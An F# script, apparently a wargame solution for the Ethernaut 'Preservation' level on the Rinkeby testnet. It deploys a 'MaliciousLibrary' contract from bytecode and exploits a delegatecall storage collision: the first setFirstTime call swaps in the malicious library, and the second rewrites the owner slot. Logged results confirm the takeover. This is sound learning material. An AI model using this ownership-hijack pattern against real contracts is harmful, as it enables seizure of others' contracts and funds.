#i """nuget: C:\Users\jon_h\source\repos\web3\web3.fs\bin\Release\"""
#r "nuget: web3.fs, 0.2.1" 

open System.Globalization
open web3.fs

// Values and partial applications
let env =createWeb3Environment "http://127.0.0.1:1248" "2.0" "0x2268b96e204379ee8366505c344ebe5cc34d3a46"

let call = makeEthCall env
let txn = makeEthTxn env

// use the webpage to deploy an instance, so that when we submit we get the blurb

// My instance: 0x3A7cc9e757234f9a4b9b5673C98E967A47bf3a23
let preservationABI = """[{"inputs":[{"internalType":"uint256","name":"_timeStamp","type":"uint256"}],"name":"setFirstTime","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"_timeStamp","type":"uint256"}],"name":"setSecondTime","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"_timeZone1LibraryAddress","type":"address"},{"internalType":"address","name":"_timeZone2LibraryAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"storedTime","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"timeZone1Library","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"timeZone2Library","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}]""" |> ABI
let preservation = loadDeployedContract env "0x3A7cc9e757234f9a4b9b5673C98E967A47bf3a23" RINKEBY preservationABI |> bindDeployedContract |> List.head

// check addresses of libraries
call preservation (ByString "timeZone1Library") []
|> env.log Log

call preservation (ByString "timeZone2Library") []
|> env.log Log

call preservation (ByString "owner") []
|> env.log Log

// [+] Call result: [Address "0x7dc17e761933d24f4917ef373f6433d4a62fe3c5"] <--- We're going to overwrite this value with our malicious library
// [+] Call result: [Address "0xea0de41efafa05e2a54d1cd3ec8ce154b1bb78f1"]
// [+] Call result: [Address "0x97e982a15fbb1c28f6b8ee971bec15c78b3d263f"]

(*
    contract MaliciousLibrary {
    address public one;
    address public two;
    address public owner;
    uint256 storedTime;

    function setTime(uint256 _padded0wner) public {
        owner = address(_padded0wner);
  }
}
*)
let maliciousLibraryABI = """[{"inputs":[{"internalType":"uint256","name":"_padded0wner","type":"uint256"}],"name":"setTime","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"one","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"two","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}]""" |> ABI
let maliciousLibraryBytecode = """608060405234801561001057600080fd5b50610205806100206000396000f3fe608060405234801561001057600080fd5b506004361061004c5760003560e01c80633beb26c4146100515780635fdf05d71461007f5780638da5cb5b146100b3578063901717d1146100e7575b600080fd5b61007d6004803603602081101561006757600080fd5b810190808035906020019092919050505061011b565b005b61008761015f565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6100bb610185565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6100ef6101ab565b604051808273ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b80600260006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600260009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff168156fea2646970667358221220e2c7f23beb1b126cbee2e9ce77af188b62cc5ce0b1611f9de7db8c11a9dff29a64736f6c634300060c0033""" |> RawContractBytecode

prepareUndeployedContract env maliciousLibraryBytecode None RINKEBY maliciousLibraryABI
|> Result.bind(deployEthContract env ZEROV)
|> env.log Log

let attack = loadDeployedContract env "0xef0b6acc8bc3b62840c2ed9d82cca9502f3d3a5e" RINKEBY maliciousLibraryABI |> bindDeployedContract |> List.head

// needs leading zero on convert because BigInteger shenanigans
txn preservation (ByString "setFirstTime") [Uint256 $"""{bigint.Parse("0ef0b6acc8bc3b62840c2ed9d82cca9502f3d3a5e", NumberStyles.AllowHexSpecifier)}"""] ZEROV
|> env.log Log

// check our change took
call preservation (ByString "timeZone1Library") []
|> env.log Log

// [+] Call result: [Address "0xef0b6acc8bc3b62840c2ed9d82cca9502f3d3a5e"] checked

// Now we call it again, this time with the intended owner of the contract, me
txn preservation (ByString "setFirstTime") [Uint256 $"""{bigint.Parse("2268b96e204379ee8366505c344ebe5cc34d3a46", NumberStyles.AllowHexSpecifier)}"""] ZEROV
|> env.log Log

call preservation (ByString "owner") []
|> env.log Log

// [+] Call result: [Address "0x2268b96e204379ee8366505c344ebe5cc34d3a46"] rekt
